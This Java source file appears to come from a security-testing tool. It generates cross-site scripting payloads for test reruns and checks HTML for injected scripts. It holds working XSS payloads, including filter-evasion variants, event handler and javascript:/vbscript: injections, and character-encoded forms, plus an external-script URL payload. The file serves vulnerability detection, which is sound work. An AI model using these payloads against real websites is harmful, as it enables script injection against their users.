package io.rivulet.internal.fuzz.generator;

import io.rivulet.internal.ParseUtils;
import io.rivulet.internal.rerun.RerunConfigBuilder;
import io.rivulet.internal.rerun.SinglePayloadRerunConfigBuilder;
import io.rivulet.internal.rerun.TestRerunConfiguration;
import io.rivulet.internal.Violation;
import org.jsoup.Jsoup;
import org.jsoup.nodes.*;
import org.jsoup.parser.Tag;

import java.lang.reflect.Field;
import java.util.*;

public class XssGenerator extends RerunGeneratorWrapper {

	// Base sink methods targeted by this type of generator
	private static final List<String> targetedSinks = Arrays.asList(
			"java/nio/channels/SocketChannel.write(Ljava/nio/ByteBuffer;)I",
			"java/nio/channels/SocketChannel.write([Ljava/nio/ByteBuffer;II)J",
			"java/nio/channels/SocketChannel.write([Ljava/nio/ByteBuffer;)J"
	);
	// Array of event handler attributes, ordered by priority for injecting scripts during rerun generation
	public static final String[] EVENT_HANDLER_ATTRIBUTES =  new String[]{"onclick", "onload", "onabort", "onactivate", "onafterprint",
			"onafterupdate", "onbeforeactivate", "onbeforecopy", "onbeforecut", "onbeforedeactivate", "onbeforeeditfocus",
			"onbeforepaste", "onbeforeprint", "onbeforeunload", "onbeforeupdate", "onbegin", "onblur", "onbounce", "oncanplay",
			"oncanplaythrough", "oncellchange", "onchange", "oncontextmenu", "oncontrolselect", "oncopy", "oncuechange", "oncut",
			"ondataavailable", "ondatasetchanged", "ondatasetcomplete", "ondblclick", "ondeactivate", "ondrag", "ondragdrop",
			"ondragend", "ondragenter", "ondragleave", "ondragover", "ondragstart", "ondrop", "ondurationchange", "onemptied",
			"onend", "onended", "onerror", "onerrorupdate", "onfilterchange", "onfinish", "onfocus", "onfocusin", "onfocusout",
			"onhashchange", "onhelp", "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onlayoutcomplete",
			"onloadeddata", "onloadedmetadata", "onloadstart", "onlosecapture", "onmediacomplete", "onmediaerror",
			"onmessage", "onmousedown", "onmouseenter", "onmouseleave", "onmousemove", "onmouseout", "onmouseover",
			"onmouseup", "onmousewheel", "onmove", "onmoveend", "onmovestart", "onoffline", "ononline", "onoutofsync",
			"onpagehide", "onpageshow", "onpaste", "onpause", "onplay", "onplaying", "onpopstate", "onprogress",
			"onpropertychange", "onratechange", "onreadystatechange", "onredo", "onrepeat", "onreset", "onresize",
			"onresizeend", "onresizestart", "onresume", "onreverse", "onrowdelete", "onrowexit", "onrowinserted",
			"onrowsenter", "onscroll", "onsearch", "onseek", "onseeked", "onseeking", "onselect", "onselectionchange",
			"onselectstart", "onstalled", "onstart", "onstop", "onstorage", "onsubmit", "onsuspend", "onsyncrestored",
			"ontimeerror", "ontimeupdate", "ontoggle", "ontrackchange", "onundo", "onunload", "onurlflip",
			"onvolumechange", "onwaiting", "onwheel", "seeksegmenttime"
	};
	// Maps tag names to attribute keys for that tag with URL values. These attributes can cause JavaScript execution
	// by causing navigating to javascript: URLs.
	private static final LinkedHashMap<String, String[]> attributeEmbeddedScriptCheckMap = new LinkedHashMap<>();
	// Maps tag names to attribute keys for that tag whose values should be checked for malicious URLs
	private static final LinkedHashMap<String, String[]> attributeExternalScriptCheckMap = new LinkedHashMap<>();
	// Example malicious URL
	public static final String MALICIOUS_URL = "https://www.rivulet.io/alert.js";
	// Padded decimal HTML character reference for the malicious url payload
	private static final String MALICIOUS_URL_CHAR_REF = encodeToPaddedDecimalCharReference(MALICIOUS_URL);
	// Padded decimal HTML character references for alert('XSS')
	private static final String ALERT_CHAR_REF = encodeToPaddedDecimalCharReference("alert('XSS')");
	// Padded decimal HTML character references for javascript:alert('XSS')
	private static final String JAVASCRIPT_ALERT_CHAR_REF = encodeToPaddedDecimalCharReference("javascript:alert('XSS')");
	// Payloads for tainted values in the content of some generic tag
	private static final List<String> basicContentPayloads = Arrays.asList(
			"<script>alert(String.fromCharCode(88,83,83))</script>",
			"<scr<script>ipt>alert(`XSS`)</script>",
			"<script>alert(`XSS`)</script>",
			String.format("<script src=%s></script>", MALICIOUS_URL),
			"<div onclick='alert(`XSS`)'>hello</div>",
			String.format("<div onclick=%s>hello</div>", ALERT_CHAR_REF)
	);
	// Payloads for tainted values in JavaScript content
	private static final List<String> javaScriptContentPayloads = Arrays.asList(
			"alert(String.fromCharCode(88,83,83));",
			"alert(`XSS`);"
	);
	// The names of HTML tags that need to be broken out of before trying to inject scripts i.e. tags that switch the
	// tokenizer out of the data state.
	private static final List<String> breakOutTagNames = Arrays.asList("frameset", "style", "textarea", "title", "xmp",
			"iframe", "noembed", "noframes", "noscript", "plaintext");
	// The name of HTML tags that should not be closed
	private static final List<String> voidElementTagNames = Arrays.asList("area", "base", "br", "col", "embed", "hr",
			"img", "input", "link", "meta", "param", "source", "track", "wbr");

	static {
		try {
			// Prepares JSoup for parsing by clearing the tags map preventing tainted common html elements from being replaced
			// with untainted versions during the parsing process.
			Field tagsField = Tag.class.getDeclaredField("tags");
			tagsField.setAccessible(true);
			Map tags = (Map)tagsField.get(null);
			tags.clear();
		} catch (Exception e) {
			//
		}

		// Build attributeEmbeddedScriptCheckMap
		attributeEmbeddedScriptCheckMap.put("a", new String[]{"href"});
		attributeEmbeddedScriptCheckMap.put("action", new String[]{"form"});
		attributeEmbeddedScriptCheckMap.put("applet", new String[]{"code"});
		attributeEmbeddedScriptCheckMap.put("area", new String[]{"href"});
		attributeEmbeddedScriptCheckMap.put("audio", new String[]{"src"});
		attributeEmbeddedScriptCheckMap.put("base", new String[]{"href"});
		attributeEmbeddedScriptCheckMap.put("blockquote", new String[]{"cite"});
		attributeEmbeddedScriptCheckMap.put("body", new String[]{"background"});
		attributeEmbeddedScriptCheckMap.put("button", new String[]{"formaction"});
		attributeEmbeddedScriptCheckMap.put("del", new String[]{"cite"});
		attributeEmbeddedScriptCheckMap.put("embed", new String[]{"src"});
		attributeEmbeddedScriptCheckMap.put("form", new String[]{"action"});
		attributeEmbeddedScriptCheckMap.put("frame", new String[]{"src"});
		attributeEmbeddedScriptCheckMap.put("html", new String[]{"manifest"});
		attributeEmbeddedScriptCheckMap.put("iframe", new String[]{"src"});
		attributeEmbeddedScriptCheckMap.put("img", new String[]{"longdesc", "src", "srcset", "lowsrc", "dynsrc"});
		attributeEmbeddedScriptCheckMap.put("input", new String[]{"src", "formaction"});
		attributeEmbeddedScriptCheckMap.put("ins", new String[]{"cite"});
		attributeEmbeddedScriptCheckMap.put("link", new String[]{"href"});
		attributeEmbeddedScriptCheckMap.put("object", new String[]{"data"});
		attributeEmbeddedScriptCheckMap.put("q", new String[]{"cite"});
		attributeEmbeddedScriptCheckMap.put("source", new String[]{"src", "srcset"});
		attributeEmbeddedScriptCheckMap.put("track", new String[]{"src"});
		attributeEmbeddedScriptCheckMap.put("video", new String[]{"poster", "src"});

		// Build attributeExternalScriptCheckMap
		attributeExternalScriptCheckMap.put("base", new String[]{"href"});
		attributeExternalScriptCheckMap.put("script", new String[]{"src"});
	}

	/* Returns builders with XSS payloads inspired by https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
	 * that leverage information about the context of the tainted values in the html document. */
	@Override
	public Collection<TestRerunConfiguration> generateReruns(Violation violation, Object receiver, Object[] arguments) {
		if(arguments == null || arguments.length != 1 || !(arguments[0] instanceof String)) {
			return new LinkedList<>();
		}
		String html = (String)arguments[0];
		LinkedHashSet<TestRerunConfiguration> configs = generateReruns(violation, html);
		if(!configs.isEmpty()) {
			return configs;
		} else {
			// A tainted value may have caused the HTML to be malformed, replace tainted section with stand-in values
			// and retry
			configs = generateReruns(violation, replaceTaintedChunksWithStandIns(html));
			if(configs.isEmpty()) {
				// Try basic reruns
				generateBasicContentReruns("", "", html, violation, configs);
			}
			return configs;
		}
	}

	/* Returns builders with XSS payloads inspired by https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
	 * that leverage information about the context of the tainted values in the html document. */
	private LinkedHashSet<TestRerunConfiguration> generateReruns(Violation violation, String html) {
		LinkedHashSet<TestRerunConfiguration> configs = new LinkedHashSet<>();
		String dummyTaintedHtml = ParseUtils.taintCharsWithPosition(new String(html));
		Document doc = Jsoup.parse(ParseUtils.taintCharsWithPosition(dummyTaintedHtml));
		doc.quirksMode(Document.QuirksMode.quirks);
		doc.outputSettings(new Document.OutputSettings().prettyPrint(false));
		for(Element element : doc.getAllElements()) {
			if(ParseUtils.containsNonDummyTaint(element.tagName())) {
				// Tainted tag name
				generateRerunsForTagName(element, violation, configs);
			}
			for(Node child : element.childNodes()) {
				if(ParseUtils.containsNonDummyTaint(child.toString())) {
					if(child instanceof Comment) {
						// Tainted comment in content
						generateRerunsForComment(element, (Comment)child, violation, configs);
					} else if(child instanceof TextNode || child instanceof DataNode) {
						// Other tainted content
						generateRerunsForContent(element, child, violation, configs);
					}
				}
			}
			LinkedList<String[]> attributes = getOriginalAttributes(element, html);
			for(String[] attribute : attributes) {
				if(ParseUtils.containsNonDummyTaint(attribute[0])) {
					// Tainted attribute key
					generateRerunsForAttributeKey(attribute, element, violation, configs);
				}
				if(ParseUtils.containsNonDummyTaint(attribute[1])) {
					// Tainted attribute value
					generateRerunsForAttributeValue(attribute, element, violation, configs);
				}
			}
		}
		return configs;
	}

	/* Adds rerun configurations to the specified set for the specified element's tainted tag name. */
	private void generateRerunsForTagName(Element element, Violation originalViolation, LinkedHashSet<TestRerunConfiguration> configs) {
		String tagName = ParseUtils.removeDummyPositionTags(element.tagName());
		Violation violation = makeProcessedViolation(originalViolation, tagName);
		LinkedHashSet<RerunConfigBuilder> builders = new LinkedHashSet<>();
		if(!violation.getTaintedValues().isEmpty()) {
			addTagNamePayloads(builders, tagName, getUnusedAttribute(element, AttributeVulnerabilityType.EXTERNAL_SCRIPT), AttributeVulnerabilityType.EXTERNAL_SCRIPT);
			addTagNamePayloads(builders, tagName, getUnusedAttribute(element, AttributeVulnerabilityType.EMBEDDED_SCRIPT), AttributeVulnerabilityType.EMBEDDED_SCRIPT);
			addTagNamePayloads(builders, tagName, getUnusedAttribute(element, AttributeVulnerabilityType.EVENT), AttributeVulnerabilityType.EVENT);
			String tagClose = (voidElementTagNames.contains(tagName) || element.tag().isSelfClosing()) ? "" : String.format("</%s>", tagName);
			builders.add(new SinglePayloadRerunConfigBuilder(String.format("%s>%s <script>alert(`XSS`)</script> <%s", tagName, tagClose, tagName)));
		}
		configs.addAll(generateReruns(violation, builders));
	}

	/* Adds single payload builders to the specified set for the specified attribute vulnerability type for replacing a
	 * a tainted tag name. */
	private void addTagNamePayloads(Set<RerunConfigBuilder> builders, String tagName, String targetedAttribute, AttributeVulnerabilityType type) {
		if(targetedAttribute != null) {
			for(String basePayload : type.getBasePayloads()) {
				builders.add(new SinglePayloadRerunConfigBuilder(String.format("%s %s=%s", tagName, targetedAttribute, basePayload)));
			}
		}
	}

	/* Adds rerun configurations to the specified set for the specified tainted content node. */
	private void generateRerunsForContent(Element element, Node node, Violation originalViolation, LinkedHashSet<TestRerunConfiguration> configs) {
		String prefix = "";
		String suffix = "";
		if(breakOutTagNames.contains(element.tagName().toLowerCase())) {
			prefix = "</" + element.tagName().toLowerCase() + ">";
			suffix = "<" + element.tagName().toLowerCase() + ">";
		}
		if("script".equalsIgnoreCase(element.tagName())) {
			generateJavaScriptContentReruns(node.toString(), originalViolation, configs, true, false);
		} else {
			generateBasicContentReruns(prefix, suffix, node.toString(), originalViolation, configs);
		}
	}

	/* Adds rerun configurations to the specified set for the the specified tainted comment. */
	private void generateRerunsForComment(Element element, Comment comment, Violation originalViolation, LinkedHashSet<TestRerunConfiguration> configs) {
		String prefix = "";
		String suffix = "";
		if(breakOutTagNames.contains(element.tagName().toLowerCase())) {
			prefix = "</" + element.tagName().toLowerCase() + ">";
			suffix = "<" + element.tagName().toLowerCase() + ">";
		}
		generateBasicContentReruns("-->" + prefix, suffix+ "<!--", comment.toString(), originalViolation, configs);
	}

	/* Adds rerun configurations to the specified set for the specified attribute's tainted key. */
	private void generateRerunsForAttributeKey(String[] attribute, Element element, Violation originalViolation,
											   LinkedHashSet<TestRerunConfiguration> configs) {
		String tagName = element.tagName();
		Violation violation = makeProcessedViolation(originalViolation, attribute[0]);
		LinkedHashSet<RerunConfigBuilder> builders = new LinkedHashSet<>();
		if(!violation.getTaintedValues().isEmpty()) {
			AttributeVulnerabilityType type =  AttributeVulnerabilityType.getVulnerability(tagName, attribute[0]);
			switch(type) {
				case EXTERNAL_SCRIPT:
					addAttributeKeyPayloads(builders, attribute[0].toLowerCase(), AttributeVulnerabilityType.EXTERNAL_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EMBEDDED_SCRIPT), AttributeVulnerabilityType.EMBEDDED_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EVENT), AttributeVulnerabilityType.EVENT);
					break;
				case EMBEDDED_SCRIPT:
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EXTERNAL_SCRIPT), AttributeVulnerabilityType.EXTERNAL_SCRIPT);
					addAttributeKeyPayloads(builders, attribute[0].toLowerCase(), AttributeVulnerabilityType.EMBEDDED_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EVENT), AttributeVulnerabilityType.EVENT);
					break;
				case EXTERNAL_AND_EMBEDDED_SCRIPT:
					addAttributeKeyPayloads(builders, attribute[0].toLowerCase(), AttributeVulnerabilityType.EXTERNAL_SCRIPT);
					addAttributeKeyPayloads(builders, attribute[0].toLowerCase(), AttributeVulnerabilityType.EMBEDDED_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EVENT), AttributeVulnerabilityType.EVENT);
					break;
				case EVENT:
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EXTERNAL_SCRIPT), AttributeVulnerabilityType.EXTERNAL_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EMBEDDED_SCRIPT), AttributeVulnerabilityType.EMBEDDED_SCRIPT);
					addAttributeKeyPayloads(builders, attribute[0].toLowerCase(), AttributeVulnerabilityType.EVENT);
					break;
				default:
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EXTERNAL_SCRIPT), AttributeVulnerabilityType.EXTERNAL_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EMBEDDED_SCRIPT), AttributeVulnerabilityType.EMBEDDED_SCRIPT);
					addAttributeKeyPayloads(builders, getUnusedAttribute(element, AttributeVulnerabilityType.EVENT), AttributeVulnerabilityType.EVENT);
			}
			builders.add(new SinglePayloadRerunConfigBuilder(String.format("%s></%s> <script>alert(`XSS`)</script> <%s %s", tagName, tagName, tagName, attribute[0])));
		}
		configs.addAll(generateReruns(violation, builders));
	}

	/* Adds single payload builders to the specified set for the specified attribute vulnerability type for replacing a
	 * a tainted attribute key. */
	private void addAttributeKeyPayloads(Set<RerunConfigBuilder> builders, String targetedAttribute, AttributeVulnerabilityType type) {
		if(targetedAttribute != null) {
			for(String basePayload : type.getBasePayloads()) {
				builders.add(new SinglePayloadRerunConfigBuilder(String.format("%s=%s title", targetedAttribute, basePayload)));
			}
		}
	}

	/* Adds rerun configurations to the specified set for the specified attribute's tainted value. */
	private void generateRerunsForAttributeValue(String[] attribute, Element element, Violation originalViolation,
												 LinkedHashSet<TestRerunConfiguration> configs) {
		if(attribute[1] == null || attribute[1].length() < 1) {
			return;
		}
		String tagName = element.tagName().toLowerCase();
		Violation violation = makeProcessedViolation(originalViolation,attribute[1]);
		String valueQuoting;
		if(attribute[1].charAt(0) != '"' && attribute[1].charAt(0) != '\'') {
			valueQuoting = "";
		} else {
			valueQuoting = attribute[1].charAt(0) + "";
		}
		String value = unquote(attribute[1]).toLowerCase();
		String decodedValue = ParseUtils.unescapeHtmlReferencesEnsuringTags(value);
		boolean allCharsTainted = allCharsTainted(value);
		boolean firstCharTainted = firstCharTainted(value);
		LinkedHashSet<RerunConfigBuilder> builders = new LinkedHashSet<>();
		if(!violation.getTaintedValues().isEmpty()) {
			AttributeVulnerabilityType type =  AttributeVulnerabilityType.getVulnerability(tagName, attribute[0]);
			String suffix = String.format("%s title=%sx", valueQuoting, valueQuoting);
			if(type == AttributeVulnerabilityType.EMBEDDED_SCRIPT || type == AttributeVulnerabilityType.EXTERNAL_AND_EMBEDDED_SCRIPT) {
				if(allCharsTainted) {
					addAttributeValuePayloads(builders, AttributeVulnerabilityType.EMBEDDED_SCRIPT, "", "");
				} else if(firstCharTainted) {
					builders.add(new SinglePayloadRerunConfigBuilder("javascript:alert(String.fromCharCode(88,83,83));//"));
					builders.add(new SinglePayloadRerunConfigBuilder(JAVASCRIPT_ALERT_CHAR_REF + encodeToPaddedDecimalCharReference(suffix+"//")));
				} else if(decodedValue.startsWith("javascript:")) {
					int index = decodedValue.indexOf("javascript:");
					String script = decodedValue.substring(index+"javascript:".length());
					generateJavaScriptContentReruns(script, originalViolation, configs, false, !value.startsWith("javascript:"));
				} else if(decodedValue.startsWith("vbscript:")) {
					int index = decodedValue.indexOf("vbscript:");
					String script = decodedValue.substring(index+"vbscript:".length());
					generateVBScriptContentReruns(script, originalViolation, configs, !value.startsWith("vbscript:"));
				}
			}
			if(type == AttributeVulnerabilityType.EXTERNAL_SCRIPT || type == AttributeVulnerabilityType.EXTERNAL_AND_EMBEDDED_SCRIPT) {
				if(allCharsTainted) {
					addAttributeValuePayloads(builders, AttributeVulnerabilityType.EXTERNAL_SCRIPT, "", "");
				} else if(firstCharTainted) {
					addAttributeValuePayloads(builders, AttributeVulnerabilityType.EXTERNAL_SCRIPT, "", suffix);
				}
			}
			if(type == AttributeVulnerabilityType.EVENT) {
				generateJavaScriptContentReruns(value, originalViolation, configs, false, false);
			} else {
				suffix = String.format(" title=%sx", valueQuoting);
				String handler = getUnusedAttribute(element, AttributeVulnerabilityType.EVENT);
				if(handler != null) {
					String prefix = String.format("x%s %s=", valueQuoting, handler);
					addAttributeValuePayloads(builders, AttributeVulnerabilityType.EVENT, prefix, suffix);
				}
			}
			String tagClose = (voidElementTagNames.contains(tagName) || element.tag().isSelfClosing()) ? "" : String.format("</%s>", tagName);
			// Payload without equals
			builders.add(new SinglePayloadRerunConfigBuilder(String.format("%s>%s <script>alert(`XSS`)</script> <!--", valueQuoting, tagClose)));
		}
		configs.addAll(generateReruns(violation, builders));
	}

	/* Adds single payload builders to the specified set for the specified attribute vulnerability type for replacing a
	 * a tainted attribute value. */
	private void addAttributeValuePayloads(Set<RerunConfigBuilder> builders, AttributeVulnerabilityType type, String prefix,
										   String suffix) {
		for(String basePayload : type.getBasePayloads()) {
			builders.add(new SinglePayloadRerunConfigBuilder(String.format("%s%s%s", prefix, basePayload, suffix)));
		}
	}

	/* Adds reruns configurations based on the basic content payloads to the specified set for the specified tainted String. */
	private void generateBasicContentReruns(String prefix, String suffix, String taintedString, Violation originalViolation,
											LinkedHashSet<TestRerunConfiguration> configs) {
		taintedString = ParseUtils.removeDummyPositionTags(taintedString);
		LinkedList<String> payloads = new LinkedList<>();
		for(String payload : basicContentPayloads) {
			payloads.add("%s" + prefix + payload + suffix);
		}
		configs.addAll(generateRerunsUsingTaintedChunks(originalViolation, taintedString, payloads,0, "[<>]"));
	}

	/* Adds reruns configurations based on the JavaScript content payloads to the specified set for the specified tainted String. */
	private void generateJavaScriptContentReruns(String taintedString, Violation originalViolation,
												 LinkedHashSet<TestRerunConfiguration> configs, boolean inContent, boolean encode) {
		if(!inContent) {
			taintedString = ParseUtils.unescapeHtmlReferencesEnsuringTags(taintedString);
		}
		List<LinkedList<String>> jsParts = ParseUtils.parseJavaScript(taintedString);
		// Generate reruns for the unquoted, uncommented tainted portions of the String
		for(String chunk : jsParts.get(0)) {
			addJavaScriptPayloads(configs, originalViolation, "", "", inContent, chunk, encode);
		}
		// Generate reruns for the commented tainted portions of the String
		for(String chunk : jsParts.get(1)) {
			if(chunk.length() > 0) {
				boolean multiLine = chunk.startsWith("/*");
				addJavaScriptPayloads(configs, originalViolation, multiLine ? "*/" : "\n", multiLine ? "/*" : "//", inContent, chunk, encode);
			}
		}
		// Generate reruns for the quoted tainted portions of the String
		for(String chunk : jsParts.get(2)) {
			if(chunk.length() > 0) {
				String quote = chunk.charAt(0) + "";
				addJavaScriptPayloads(configs, originalViolation, quote + "; ", " var xyz = " + quote, inContent, chunk, encode);
			}
		}
	}

	/* Adds single payload reruns configurations to the specified set for replacing a tainted javascript chunk. */
	private void addJavaScriptPayloads(LinkedHashSet<TestRerunConfiguration> configs, Violation originalViolation,
									   String prefix, String suffix, boolean inContent, String chunk, boolean encode) {
		if(ParseUtils.containsNonDummyTaint(chunk)) {
			chunk = ParseUtils.removeDummyPositionTags(chunk);
			LinkedList<RerunConfigBuilder> builders = new LinkedList<>();
			for(String payload : javaScriptContentPayloads) {
				if(encode) {
					builders.add(new SinglePayloadRerunConfigBuilder(encodeToPaddedDecimalCharReference(prefix + payload + suffix)));
				} else {
					builders.add(new SinglePayloadRerunConfigBuilder(prefix + payload + suffix));
					if(!inContent) {
						builders.add(new SinglePayloadRerunConfigBuilder(encodeToPaddedDecimalCharReference(prefix) + payload + encodeToPaddedDecimalCharReference(suffix)));
					}
				}
			}
			if(inContent && !encode) {
				builders.add(new SinglePayloadRerunConfigBuilder(String.format("</script><div onclick=%s>hello</div><script>", ALERT_CHAR_REF)));
			}

			Violation violation = makeProcessedViolation(originalViolation, chunk);
			if(!violation.getTaintedValues().isEmpty()) {
				configs.addAll(generateReruns(violation, builders));
			}
		}
	}

	/* Adds reruns configurations based on the script content payloads to the specified set for the specified tainted String. */
	private void generateVBScriptContentReruns(String taintedString, Violation originalViolation,
											   LinkedHashSet<TestRerunConfiguration> configs, boolean encode) {
		List<LinkedList<String>> vbsParts = ParseUtils.parseVBScript(ParseUtils.unescapeHtmlReferencesEnsuringTags(taintedString));
		// Generate reruns for the unquoted, uncommented tainted portions of the String
		for(String chunk : vbsParts.get(0)) {
			addVBScriptPayloads(configs, originalViolation, "", "", chunk, encode);
		}
		// Generate reruns for the commented tainted portions of the String
		for(String chunk : vbsParts.get(1)) {
			addVBScriptPayloads(configs, originalViolation, "\n", chunk.startsWith("'") ? "'" : "REM", chunk, encode);
		}
		// Generate reruns for the quoted tainted portions of the String
		for(String chunk : vbsParts.get(2)) {
			addVBScriptPayloads(configs, originalViolation, "\"", "\n\"", chunk, encode);
		}
	}

	/* Adds single payload reruns configurations to the specified set for replacing a tainted javascript chunk. */
	private void addVBScriptPayloads(LinkedHashSet<TestRerunConfiguration> configs, Violation originalViolation,
									 String prefix, String suffix, String chunk, boolean encode) {
		if(ParseUtils.containsNonDummyTaint(chunk)) {
			chunk = ParseUtils.removeDummyPositionTags(chunk);
			LinkedList<RerunConfigBuilder> builders = new LinkedList<>();
			if(encode) {
				builders.add(new SinglePayloadRerunConfigBuilder(encodeToPaddedDecimalCharReference(prefix + "msgbox(\"xss\")" + suffix)));
			} else {
				builders.add(new SinglePayloadRerunConfigBuilder(prefix + "msgbox(\"xss\")" + suffix));
				builders.add(new SinglePayloadRerunConfigBuilder(encodeToPaddedDecimalCharReference(prefix) +
						"msgbox(\"xss\")" + encodeToPaddedDecimalCharReference(suffix)));
			}
			Violation violation = makeProcessedViolation(originalViolation, chunk);
			if(!violation.getTaintedValues().isEmpty()) {
				configs.addAll(generateReruns(violation, builders));
			}
		}
	}

	/* Returns an unused attribute of the specified non-NONE type for the specified element. */
	private String getUnusedAttribute(Element element, AttributeVulnerabilityType type) {
		String tagName = element.tagName().toLowerCase();
		switch(type) {
			case EXTERNAL_SCRIPT:
				return getUnusedAttribute(element, attributeExternalScriptCheckMap.get(tagName));
			case EMBEDDED_SCRIPT:
				return getUnusedAttribute(element, attributeEmbeddedScriptCheckMap.get(tagName));
			case EVENT:
				return getUnusedAttribute(element, EVENT_HANDLER_ATTRIBUTES);
			case EXTERNAL_AND_EMBEDDED_SCRIPT:
				if(attributeEmbeddedScriptCheckMap.containsKey(tagName) && attributeExternalScriptCheckMap.containsKey(tagName)) {
					String[] scriptKeys = attributeEmbeddedScriptCheckMap.get(tagName);
					for(String urlKey : attributeExternalScriptCheckMap.get(tagName)) {
						if(!element.hasAttr(urlKey)) {
							for(String scriptKey : scriptKeys) {
								if(scriptKey.equals(urlKey)) {
									return urlKey;
								}
							}
						}
					}
				}
			default:
				return null;
		}
	}

	/* Returns the first String attribute key in the specified array that the specified element does not have or null if
	 * the specified element has all of the specified attributes. */
	private String getUnusedAttribute(Element element, String[] attributeKeys) {
		if(attributeKeys == null) {
			return null;
		}
		for(String key : attributeKeys) {
			if(!element.hasAttr(key)) {
				return key;
			}
		}
		return null;
	}

	/* Parses the specified String into an HTML document and checks the taint tags of elements in vulnerable slots of
	 * that document. */
	@Override
	public void checkTaint(Object obj, int argIndex, Violation violation) {
		if(obj instanceof String) {
			String html = (String) obj;
			Document doc = Jsoup.parse(ParseUtils.taintCharsWithPosition(html));
			doc.quirksMode(Document.QuirksMode.quirks);
			doc.outputSettings(new Document.OutputSettings().prettyPrint(false));
			// Check the vulnerable slots of each element for scripts and malicious URLS
			element:
			for(Element element : doc.getAllElements()) {
				// Check special tags
				if(isCriticalScriptTag(element) || isCriticalMetaTag(element, html) || isCriticalParamTag(element, html)) {
					reportElement(element, html, argIndex, violation);
					continue;
				}
				// Check the values of event handler attributes
				for(String attribute : EVENT_HANDLER_ATTRIBUTES) {
					if(element.hasAttr(attribute)) {
						String originalValue = unquote(getOriginalAttributeValue(element, html, attribute));
						if(checkScript(originalValue, true, true)) {
							reportElement(element, html, argIndex, violation);
							continue element;
						}
					}
				}
				String tagName = element.tagName().toLowerCase();
				// Check attribute values for malicious urls
				if(attributeExternalScriptCheckMap.containsKey(tagName)) {
					for(String attrKey : attributeExternalScriptCheckMap.get(tagName)) {
						String originalValue = getOriginalAttributeValue(element, html, attrKey);
						if(checkAttributeValueForUntrustedURL(originalValue)) {
							reportElement(element, html, argIndex, violation);
							continue element;
						}
					}
				}
				// Check attribute values for scripts
				if(attributeEmbeddedScriptCheckMap.containsKey(tagName)) {
					for(String attrKey : attributeEmbeddedScriptCheckMap.get(tagName)) {
						if(checkAttributeValueForScripts(getOriginalAttributeValue(element, html, attrKey))) {
							reportElement(element, html, argIndex, violation);
							continue element;
						}
					}
				}
			}
		}
	}

	/* Reports a critical violation for the specified element. */
	private void reportElement(Element element, String originalHtml, int argIndex, Violation violation) {
		int[] ranges = ParseUtils.getMergedRangesFromTaints(element.toString()).getRangesCopy();
		if(ranges.length > 1) {
			String original = "<" + originalHtml.substring(ranges[0], ranges[ranges.length-1]) + ">";
			String endTag = "</" + element.tagName() + ">";
			if(element.toString().endsWith(endTag)) {
				original += endTag;
			}
			super.checkTaint(ParseUtils.removeDummyPositionTags(original), argIndex, violation, false);
			if(!violation.getTaintedValues().isEmpty()) {
				return;
			}
		}
		super.checkTaint(ParseUtils.removeDummyPositionTags(element.toString()), argIndex, violation, false);
		if(!violation.getTaintedValues().isEmpty()) {
			return;
		}
		// If Jsoup messed up the taint tags in a major way just report all of the html
		super.checkTaint(ParseUtils.removeDummyPositionTags(originalHtml), argIndex, violation, false);
	}

	/* Return whether the specified element is a "script" tag with a tainted script injected into its content. */
	private boolean isCriticalScriptTag(Element element) {
		return element.tagName().equalsIgnoreCase("script") && checkScript(element.html(), true, false);
	}

	/* Return whether the specified element is a "meta" tag with a tainted script injected into its "content" attribute's
	 * value. */
	private boolean isCriticalMetaTag(Element element, String originalHtml) {
		return element.tagName().equalsIgnoreCase("meta") &&
				"refresh".equalsIgnoreCase(element.attr("http-equiv")) &&
				checkAttributeValueForScripts(getOriginalAttributeValue(element, originalHtml, "content"));
	}

	/* Return whether the specified element is a "param" tag with a tainted script injected into its "value" attribute's
	 * value. */
	private boolean isCriticalParamTag(Element element, String originalHtml) {
		return element.tagName().equalsIgnoreCase("param") &&
				"object".equalsIgnoreCase(element.parent().tagName()) &&
				("src".equalsIgnoreCase(element.attr("name")) ||
						"data".equalsIgnoreCase(element.attr("name"))) &&
				checkAttributeValueForScripts(getOriginalAttributeValue(element, originalHtml, "value"));
	}

	/* Uses dummy char position taint tags on the specified Element to find the portion of the specified original
	 * html string that corresponds to the attributes of the specified Element. Returns a list of the attributes
	 * parsed from the original html or and empty list if the original attributes could not be determined. */
	private static LinkedList<String[]> getOriginalAttributes(Element element, String originalHtml) {
		int[] ranges = null;
		if(element.attributes().size() > 0) {
			for(Attribute a : element.attributes()) {
				ranges = ParseUtils.getMergedRangesFromTaints(a.getKey()).getRangesCopy();
				if(ranges != null && ranges.length > 1) {
					break;
				}
			}
		}
		if(ranges != null && ranges.length > 1) {
			int tagStartIndex = ranges[0];
			for(int i = tagStartIndex; i >=0; i--) {
				if(originalHtml.charAt(i) == '<') {
					tagStartIndex = i;
					break;
				}
			}
			String htmlFromTagStart = ParseUtils.removeDummyPositionTags(originalHtml.substring(tagStartIndex));
			return ParseUtils.parseAttributesFromStartOfHtmlOpeningTag(htmlFromTagStart);
		} else {
			return new LinkedList<>();
		}
	}

	/* Uses dummy char position taint tags on the specified Element to find the portion of the specified original
	 * html string that corresponds to the value of the specified attribute key for the Element or null if the original
	 * portion could not be determined or the Element does not have the specified attribute. */
	private static String getOriginalAttributeValue(Element element, String originalHtml, String attributeKey) {
		if(element.hasAttr(attributeKey)) {
			LinkedList<String[]> attributes = getOriginalAttributes(element, originalHtml);
			for(String[] attribute : attributes) {
				if(attributeKey.equalsIgnoreCase(attribute[0]) && attribute[1] != null) {
					return attribute[1];
				}
			}
		}
		return null;
	}

	/* If the specified String is quoted removes the quoted portion from its outermost quoted, otherwise returns the
